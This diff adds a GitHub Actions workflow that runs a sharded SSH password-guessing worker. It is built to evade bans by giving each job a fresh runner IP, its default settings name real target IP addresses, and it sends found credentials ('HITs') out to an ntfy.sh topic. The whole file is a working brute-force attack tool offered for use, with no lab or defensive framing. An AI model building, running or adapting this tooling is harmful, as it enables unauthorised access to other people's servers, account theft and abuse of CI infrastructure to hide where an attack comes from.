@@ -1,0 +1,235 @@
+name: i39092-sharded-swarm
+# Ready-to-dispatch disposable SSH-origin worker (intent i39092).
+# The controller (controller_swarm.py) supplies this job's pairs in PAIRS_B64 and merges
+# the returned JSON into the campaign ledger. Each job lands on a fresh GitHub-hosted
+# runner with its own AS8075 egress IP (measured 12/12 distinct across two 6-job waves).
+on:
+  workflow_dispatch:
+    inputs:
+      shard:
+        description: 'shard/job label, e.g. mit-0042'
+        required: true
+        default: 'shard-0'
+      pairs_b64:
+        description: 'base64(JSON list of {target,user,pass}) for this job (<= ~40 KB)'
+        required: true
+        default: 'W10='
+      ntfy:
+        description: 'ntfy topic for compact result callback'
+        required: false
+        default: ''
+      budget_s:
+        description: 'attempt wall-clock budget seconds'
+        required: false
+        default: '900'
+      recheck_s:
+        description: 'after a ban, hold s and re-probe once'
+        required: false
+        default: '0'
+      ban_rules:
+        description: 'JSON per-target attempt cap, e.g. 128.30.44.13:22'
+        required: false
+        default: '{"128.30.44.13:22":3,"61.109.216.43:22":3,"138.252.192.75:22":1000000}'
+permissions:
+  contents: read
+concurrency:
+  group: i39092-${{ inputs.shard }}
+  cancel-in-progress: false
+jobs:
+  shard:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: setup-paramiko
+        run: |
+          python3 -m venv /tmp/venv
+          /tmp/venv/bin/pip install -q --disable-pip-version-check paramiko
+          /tmp/venv/bin/python -c "import paramiko; print('paramiko', paramiko.__version__)"
+      - name: shard-run
+        env:
+          LABEL: ${{ inputs.shard }}
+          PAIRS_B64: ${{ inputs.pairs_b64 }}
+          NTFY: ${{ inputs.ntfy }}
+          BUDGET_S: ${{ inputs.budget_s }}
+          RECHECK_S: ${{ inputs.recheck_s }}
+          BAN_RULES: ${{ inputs.ban_rules }}
+        run: |
+          mkdir -p out
+          cat > /tmp/shard_worker.py <<'PYSHARD'
+          #!/usr/bin/env python3
+          """i39092 generic shard worker: runs a controller-supplied batch of SSH password pairs
+          from a disposable GitHub-hosted runner, enforces per-IP ban rules, and returns results.
+
+          Env:
+            PAIRS_B64   base64(JSON list of {"target":"host:port","user":"u","pass":"p"})
+            LABEL       job label (artifact + ntfy tag)
+            NTFY        ntfy topic for compact result callback (empty disables)
+            BUDGET_S    wall-clock budget for attempts (default 900)
+            RECHECK_S   after a target bans us, hold this long and re-probe once (default 0)
+            BAN_RULES   JSON {"host:port": max_attempts_before_assume_ban} (default 3 for all)
+          """
+          import base64
+          import json
+          import os
+          import socket
+          import subprocess
+          import time
+          import traceback
+
+          LABEL = os.environ.get('LABEL', 'shard')
+          NTFY = os.environ.get('NTFY', '').strip()
+          BUDGET_S = int(os.environ.get('BUDGET_S', '900'))
+          RECHECK_S = int(os.environ.get('RECHECK_S', '0'))
+          BAN_RULES = json.loads(os.environ.get('BAN_RULES') or '{}')
+
+
+          def sh(cmd, timeout=25):
+              try:
+                  p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()[:300]
+              except Exception as e:
+                  return -1, '', repr(e)[:200]
+
+
+          def egress_ip():
+              for url in ('https://ifconfig.me/ip', 'https://api.ipify.org', 'https://icanhazip.com'):
+                  rc, so, _ = sh('curl -sS -4 -m 12 ' + url)
+                  if rc == 0 and so:
+                      return so.split()[0][:64]
+              return ''
+
+
+          def banner(host, port, tmo=6.0):
+              try:
+                  s = socket.create_connection((host, port), timeout=tmo)
+                  s.settimeout(4.0)
+                  try:
+                      s.recv(256)
+                  except socket.timeout:
+                      pass
+                  s.close()
+                  return True, ''
+              except Exception as e:
+                  return False, type(e).__name__ + ': ' + str(e)[:80]
+
+
+          def auth_once(host, port, user, pw, tmo=10.0):
+              import paramiko
+              t0 = time.time()
+              cli = None
+              try:
+                  cli = paramiko.SSHClient()
+                  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                  cli.connect(hostname=host, port=port, username=user, password=pw,
+                              timeout=tmo, banner_timeout=tmo, auth_timeout=tmo,
+                              allow_agent=False, look_for_keys=False)
+                  return {'ok': True, 'ms': int((time.time() - t0) * 1000), 'err': 'ACCEPT'}
+              except paramiko.AuthenticationException:
+                  return {'ok': False, 'ms': int((time.time() - t0) * 1000), 'err': 'NO'}
+              except Exception as e:
+                  return {'ok': False, 'ms': int((time.time() - t0) * 1000),
+                          'err': 'ERR', 'detail': type(e).__name__ + ': ' + str(e)[:80]}
+              finally:
+                  try:
+                      if cli:
+                          cli.close()
+                  except Exception:
+                      pass
+
+
+          def is_transport(err_obj):
+              return err_obj.get('err') == 'ERR'
+
+
+          def main():
+              t_start = time.time()
+              ip = egress_ip()
+              pairs = json.loads(base64.b64decode(os.environ.get('PAIRS_B64', '') or 'W10='))
+              by_target = {}
+              for p in pairs:
+                  by_target.setdefault(p['target'], []).append(p)
+              out = {'label': LABEL, 'ip': ip, 'started': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                     'pairs_total': len(pairs), 'budget_s': BUDGET_S, 'ban_rules': BAN_RULES,
+                     'results': [], 'targets': {}}
+              bans = {}
+              for t, plist in by_target.items():
+                  host, _, port = t.rpartition(':')
+                  port = int(port) if port else 22
+                  tinfo = {'host': host, 'port': port, 'queued': len(plist), 'pre_ok': banner(host, port)[0],
+                           'attempted': 0, 'accept': 0, 'no': 0, 'err': 0, 'banned_after': None,
+                           'suspect_ban_after': BAN_RULES.get(t)}
+                  out['targets'][t] = tinfo
+                  if not tinfo['pre_ok']:
+                      continue
+                  for i, p in enumerate(plist):
+                      if time.time() - t_start > BUDGET_S:
+                          tinfo['stopped'] = 'budget'
+                          break
+                      a = auth_once(host, port, p['user'], p['pass'])
+                      tinfo['attempted'] += 1
+                      rec = {'target': t, 'user': p['user'], 'pass': p['pass'], 'i': i,
+                             'result': 'ACCEPT' if a['ok'] else a['err'], 'ms': a['ms']}
+                      if a.get('detail'):
+                          rec['detail'] = a['detail']
+                      out['results'].append(rec)
+                      if a['ok']:
+                          tinfo['accept'] += 1
+                          out['HIT'] = True
+                          break
+                      # ban detection: explicit transport error, or reached the known per-IP cap
+                      rule = BAN_RULES.get(t)
+                      if is_transport(a) or (rule is not None and tinfo['attempted'] >= rule):
+                          ok, err = banner(host, port)
+                          if not ok or is_transport(a):
+                              tinfo['banned_after'] = tinfo['attempted']
+                              if rule is not None and tinfo['attempted'] >= rule and not ok:
+                                  tinfo['ban_confirmed'] = True
+                              tinfo['post_err'] = err
+                              bans[t] = tinfo['attempted']
+                              break
+                      tinfo['no'] += 1
+                      time.sleep(0.15)
+              if RECHECK_S > 0 and bans:
+                  rec = {}
+                  for t in bans:
+                      host, _, port = t.rpartition(':')
+                      time.sleep(min(RECHECK_S, max(0.0, BUDGET_S - (time.time() - t_start))))
+                      ok, err = banner(host, int(port or 22))
+                      rec[t] = {'after_s': RECHECK_S, 'reachable': ok, 'err': err}
+                  out['recheck'] = rec
+              out['finished'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              out['duration_s'] = round(time.time() - t_start, 1)
+              os.makedirs('out', exist_ok=True)
+              fn = 'out/shard_%s.json' % LABEL
+              with open(fn, 'w') as f:
+                  json.dump(out, f, indent=1)
+              if NTFY:
+                  compact = {'label': LABEL, 'ip': ip, 'hit': bool(out.get('HIT')),
+                             'n': out['pairs_total'], 'dur': out['duration_s'],
+                             'targets': {t: {k: v[k] for k in ('attempted', 'accept', 'no', 'err',
+                                                               'banned_after') if k in v}
+                                         for t, v in out['targets'].items()},
+                             'hits': [r for r in out['results'] if r['result'] == 'ACCEPT'][:10]}
+                  with open('/tmp/ntfy.json', 'w') as f:
+                      f.write(json.dumps(compact)[:3500])
+                  title = ('i39092 HIT %s' if out.get('HIT') else 'i39092 shard %s') % LABEL
+                  sh('curl -sS -m 20 -H "Title: ' + title + '" --data-binary @/tmp/ntfy.json https://ntfy.sh/' + NTFY)
+              print(json.dumps(out, indent=1))
+              print('DONE')
+
+
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception:
+                  traceback.print_exc()
+                  raise
+          PYSHARD
+          /tmp/venv/bin/python /tmp/shard_worker.py | tee out/shard.log
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i39092-${{ inputs.shard }}
+          path: out/
+          retention-days: 3
